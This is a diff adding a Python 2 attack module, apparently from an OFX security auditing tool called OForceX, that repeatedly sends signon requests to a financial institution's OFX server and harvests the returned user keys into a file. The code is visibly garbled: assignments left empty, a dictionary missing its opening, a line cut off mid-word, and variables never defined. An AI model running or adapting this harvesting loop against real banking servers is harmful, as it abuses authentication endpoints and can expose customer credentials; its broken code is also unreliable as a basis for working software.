@@ -1,0 +1,53 @@
+#!/usr/bin/python
+#
+# audit_anon_auth.py
+#
+# A portion of OForceX
+# Written by Antimoon
+#
+
+def attack(keyfile='userkeys', attacklen=1000):
+    '''This attack module leverages the genuserkey function to harvest 
+       a large number of userkeys'''
+
+signon_var_dict['userid']   = 
+signon_var_dict['userpass'] =
+    'finame'       : config.get('Signon','finame')                     ,
+    'fid'          : config.get('Signon','fid')                        ,
+    'ofxtimestamp' : datetime.datetime.now().strftime('%Y%m%d%H%M%S')  ,
+    'userid'       : config.get('Signon','userid')                     ,
+    'userpass'     : config.get('Signon','userpass')                   ,
+    'genuserkey'   : config.get('Signon','genuserkey')                 ,
+    'userkey'      : config.get('Signon','userkey')                    ,
+    'lang'         : config.get('Signon','lang')                       ,
+    'appid'        : config.get('Signon','appid')                      ,
+    'appver'       : config.get('Signon','appver')                     ,
+    'clientuid'    : trnuid_gen()                                      ,
+    'sesscookie'   : config.get('Signon','sesscookie')                 ,
+    'mfa_trnuid'   : trnuid_gen()                                      ,
+    'mfa_id'       : config.get('Signon','mfa_id')                     ,
+    'mfa_answer'   : config.get('Signon','mfa_answer')                 ,
+    'newuserpass'  : config.get('Signon','newuserpass')                ,
+    'ficertid'     : c
+
+    try:
+        while i <= attacklen:
+            ofxbody        = ofx_body_builder()
+            ofxheaders     = ofxheaders()
+            content_length = str(len(ofxheaders+ofxbody))
+            httpheaders    = header_builder(path, httphost, content_length)
+            requestfull    = httpheaders + ofxheaders + ofxbody
+            out            = http_request(httphost, requestfull, ssl=True, port=443)
+            key            = out.split('<USERKEY>')[1].split('</USERKEY>')[0]
+
+            file = open(keyfile, "a")
+            file.write(key)
+            file.close()
+
+            i+=1
+
+        sys.exit(0)
+
+    except Exception, e:
+        print '[!] Error %s' % e
+        sys.exit(1)
